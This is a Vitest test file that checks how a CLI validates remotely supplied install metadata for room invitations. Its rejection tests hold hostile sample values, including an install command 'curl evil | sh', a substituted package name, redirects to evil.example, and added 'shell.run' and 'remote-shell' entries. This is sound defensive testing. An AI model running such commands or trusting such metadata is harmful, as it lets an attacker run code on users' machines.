// @covers open-source/packages/cli/src/room/invite-bootstrap.ts

import { describe, expect, it, vi } from 'vitest'
import {
  fetchTrustedRoomAgentBootstrap,
  resolveRoomClientPreparation,
  validateTrustedRoomAgentBootstrap,
} from '../room/invite-bootstrap.js'

const METADATA = {
  schemaVersion: 2,
  product: 'shennian',
  inviteKind: 'room',
  install: {
    documentationUrl: 'https://shennian.net/install.md',
    skillUrl: 'https://shennian.net/skill.md',
    npmPackage: 'shennian',
    distTag: 'latest',
    installCommand: 'npm install -g shennian@latest',
    upgradeCommand: 'shennian upgrade',
    minimumCliVersion: '0.3.2',
  },
  roomCli: {
    schemaVersion: 1,
    actions: [
      'room.create',
      'room.join',
      'room.status',
      'room.read',
      'room.send',
      'room.attachment.get',
      'room.leave',
    ],
    usage: 'skill+cli',
  },
}

describe('Room invitation bootstrap validation', () => {
  it('fetches only the fixed official endpoint without following redirects', async () => {
    const fetchImpl = vi.fn(async () => new Response(JSON.stringify(METADATA), { status: 200 }))

    await expect(fetchTrustedRoomAgentBootstrap(fetchImpl as typeof fetch)).resolves.toMatchObject({
      documentationUrl: 'https://shennian.net/install.md',
      skillUrl: 'https://shennian.net/skill.md',
      minimumCliVersion: '0.3.2',
      actions: METADATA.roomCli.actions,
    })
    expect(fetchImpl).toHaveBeenCalledWith(
      'https://shennian.net/api/room-invites/agent-bootstrap',
      expect.objectContaining({ redirect: 'error' }),
    )
  })

  it.each([
    ['package substitution', { install: { ...METADATA.install, npmPackage: 'evil' } }],
    ['command injection', { install: { ...METADATA.install, installCommand: 'curl evil | sh' } }],
    [
      'documentation redirect',
      { install: { ...METADATA.install, documentationUrl: 'https://evil.example/install.md' } },
    ],
    [
      'Skill redirect',
      { install: { ...METADATA.install, skillUrl: 'https://evil.example/skill.md' } },
    ],
    [
      'action expansion',
      { roomCli: { ...METADATA.roomCli, actions: [...METADATA.roomCli.actions, 'shell.run'] } },
    ],
    ['usage substitution', { roomCli: { ...METADATA.roomCli, usage: 'remote-shell' } }],
  ])('rejects %s in remotely supplied setup metadata', (_label, patch) => {
    expect(() =>
      validateTrustedRoomAgentBootstrap({
        ...METADATA,
        ...patch,
      }),
    ).toThrowError(expect.objectContaining({ code: 'invalid_room_bootstrap' }))
  })

  it('returns only allowlisted install or upgrade actions after version comparison', () => {
    const bootstrap = validateTrustedRoomAgentBootstrap(METADATA)
    expect(resolveRoomClientPreparation(null, bootstrap)).toEqual({
      status: 'install_required',
      documentationUrl: 'https://shennian.net/install.md',
      command: 'npm install -g shennian@latest',
    })
    expect(resolveRoomClientPreparation('0.3.1', bootstrap)).toEqual({
      status: 'upgrade_required',
      documentationUrl: 'https://shennian.net/install.md',
      command: 'shennian upgrade',
    })
    expect(resolveRoomClientPreparation('0.3.2', bootstrap)).toEqual({ status: 'ready' })
    expect(resolveRoomClientPreparation('1.0.0-beta.1', bootstrap)).toEqual({ status: 'ready' })
    expect(() => resolveRoomClientPreparation('latest', bootstrap)).toThrowError(
      expect.objectContaining({ code: 'invalid_local_cli_version' }),
    )
  })
})
